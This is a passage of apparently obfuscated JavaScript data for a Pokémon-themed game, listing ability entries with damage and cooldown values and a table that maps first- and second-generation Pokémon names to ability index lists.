"kind": _0xstr(0x504), "cat": _0xstr(0x505), "dmg": 12, "cd": 1.05, "desc": _0xstr(0x506), "evo": _0xstr(0x507) }, { "id": _0xstr(0x508), "name": _0xstr(0x509), "type": _0xstr(0x50a), "kind": _0xstr(0x50b), "cat": _0xstr(0x50c), "dmg": 22, "cd": 0.7, "desc": _0xstr(0x50d), "evo": _0xstr(0x50e) }, { "id": _0xstr(0x50f), "name": _0xstr(0x510), "type": _0xstr(0x511), "kind": _0xstr(0x512), "cat": _0xstr(0x513), "dmg": 11, "cd": 1, "desc": _0xstr(0x514), "evo": _0xstr(0x515) }], "mons": { "bulbasaur": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "ivysaur": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "venusaur": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "charmander": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "charmeleon": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "charizard": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "squirtle": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "wartortle": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "blastoise": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "caterpie": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "metapod": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "butterfree": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "weedle": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "kakuna": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "beedrill": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "pidgey": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "pidgeotto": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "pidgeot": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "rattata": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "raticate": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "spearow": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "fearow": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "ekans": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "arbok": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "pikachu": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "raichu": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "sandshrew": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "sandslash": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "nidoran♀": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "nidorina": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "nidoqueen": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 25, 32, 53, 55, 77, 78], "nidoran♂": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "nidorino": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "nidoking": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 25, 32, 53, 55, 77, 78], "clefairy": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "clefable": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "vulpix": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "ninetales": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "jigglypuff": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 46, 47, 96, 97, 98], "wigglytuff": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 46, 47, 96, 97, 98], "zubat": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 26, 27, 61, 79, 80], "golbat": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 26, 27, 61, 79, 80], "oddish": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "gloom": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "vileplume": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "paras": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "parasect": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "venonat": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "venomoth": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "diglett": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "dugtrio": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "meowth": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "persian": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "psyduck": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 10, 11, 12, 13, 63, 68], "golduck": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "mankey": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "primeape": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "growlithe": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "arcanine": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "poliwag": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "poliwhirl": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "poliwrath": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 40, 41, 88, 89, 90], "abra": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "kadabra": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "alakazam": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "machop": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "machoke": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "machamp": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "bellsprout": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "weepinbell": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "victreebel": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "tentacool": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 24, 30, 31, 56, 76], "tentacruel": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 24, 30, 31, 56, 76], "geodude": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "graveler": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "golem": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "ponyta": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "rapidash": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "slowpoke": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 10, 11, 12, 13, 63, 68, 22, 23, 54, 74, 75], "slowbro": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 21, 22, 23, 54, 74, 75], "magnemite": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 48, 49, 58, 99, 100], "magneton": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 48, 49, 58, 99, 100], "farfetch’d": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "doduo": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "dodrio": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "seel": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "dewgong": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 38, 39, 57, 86, 87], "grimer": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "muk": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "shellder": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "cloyster": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 38, 39, 57, 86, 87], "gastly": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 24, 30, 31, 56, 76], "haunter": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 24, 30, 31, 56, 76], "gengar": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 24, 30, 31, 56, 76], "onix": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 25, 32, 53, 55, 77, 78], "drowzee": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "hypno": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "krabby": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "kingler": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "voltorb": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "electrode": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "exeggcute": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 21, 22, 23, 54, 74, 75], "exeggutor": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 21, 22, 23, 54, 74, 75], "cubone": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "marowak": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "hitmonlee": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "hitmonchan": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "lickitung": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "koffing": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "weezing": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "rhyhorn": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 36, 37, 83, 84, 85], "rhydon": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 36, 37, 83, 84, 85], "chansey": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "tangela": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "kangaskhan": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "horsea": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "seadra": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "goldeen": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "seaking": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "staryu": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "starmie": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 21, 22, 23, 54, 74, 75], "mr. mime": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 46, 47, 96, 97, 98], "scyther": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "jynx": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 21, 22, 23, 54, 74, 75], "electabuzz": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "magmar": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "pinsir": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "tauros": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "magikarp": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "gyarados": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "lapras": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 38, 39, 57, 86, 87], "ditto": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "eevee": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "vaporeon": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "jolteon": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "flareon": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "porygon": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "omanyte": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "omastar": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "kabuto": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "kabutops": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "aerodactyl": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 26, 27, 61, 79, 80], "snorlax": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "articuno": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 26, 27, 61, 79, 80], "zapdos": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 26, 27, 61, 79, 80], "moltres": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "dratini": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "dragonair": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "dragonite": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 26, 27, 61, 79, 80], "mewtwo": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "mew": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "chikorita": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "bayleef": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "meganium": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "cyndaquil": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "quilava": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "typhlosion": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "totodile": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "croconaw": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "feraligatr": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "sentret": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "furret": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "hoothoot": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "noctowl": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "ledyba": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "ledian": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "spinarak": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "ariados": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "crobat": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 26, 27, 61, 79, 80], "chinchou": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 18, 19, 20, 72, 73], "lanturn": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 18, 19, 20, 72, 73], "pichu": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "cleffa": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "igglybuff": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 46, 47, 96, 97, 98], "togepi": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "togetic": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98, 26, 27, 61, 79, 80], "natu": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "xatu": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "mareep": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "flaaffy": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "ampharos": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "bellossom": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "marill": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 46, 47, 96, 97, 98], "azumarill": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 46, 47, 96, 97, 98], "sudowoodo": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "politoed": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "hoppip": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "skiploom": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "jumpluff": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "aipom": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "sunkern": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "sunflora": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "yanma": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "wooper": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "quagsire": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "espeon": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "umbreon": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "murkrow": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 26, 27, 61, 79, 80], "slowking": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 21, 22, 23, 54, 74, 75], "misdreavus": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "unown": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "wobbuffet": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "girafarig": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 21, 22, 23, 54, 74, 75], "pineco": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "forretress": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 48, 49, 58, 99, 100], "dunsparce": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "gligar": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 26, 27, 61, 79, 80], "steelix": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 25, 32, 53, 55, 77, 78], "snubbull": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "granbull": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "qwilfish": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 24, 30, 31, 56, 76], "scizor": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 48, 49, 58, 99, 100], "shuckle": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 36, 37, 83, 84, 85], "heracross": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 40, 41, 88, 89, 90], "sneasel": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 38, 39, 57, 86, 87], "teddiursa": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "ursaring": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "slugma": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "magcargo": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 36, 37, 83, 84, 85], "swinub": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 25, 32, 53, 55, 77, 78], "piloswine": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 25, 32, 53, 55, 77, 78], "corsola": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 36, 37, 83, 84, 85], "remoraid": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "octillery": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "delibird": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 26, 27, 61, 79, 80], "mantine": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "skarmory": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 26, 27, 61, 79, 80], "houndour": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 6, 7, 8, 9, 59, 62, 67], "houndoom": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 6, 7, 8, 9, 59, 62, 67], "kingdra": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 44, 45, 93, 94, 95], "phanpy": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "donphan": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "porygon2": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "stantler": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "smeargle": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "tyrogue": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "hitmontop": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "smoochum": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87, 21, 22, 23, 54, 74, 75], "elekid": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "magby": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "miltank": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "blissey": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "raikou": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 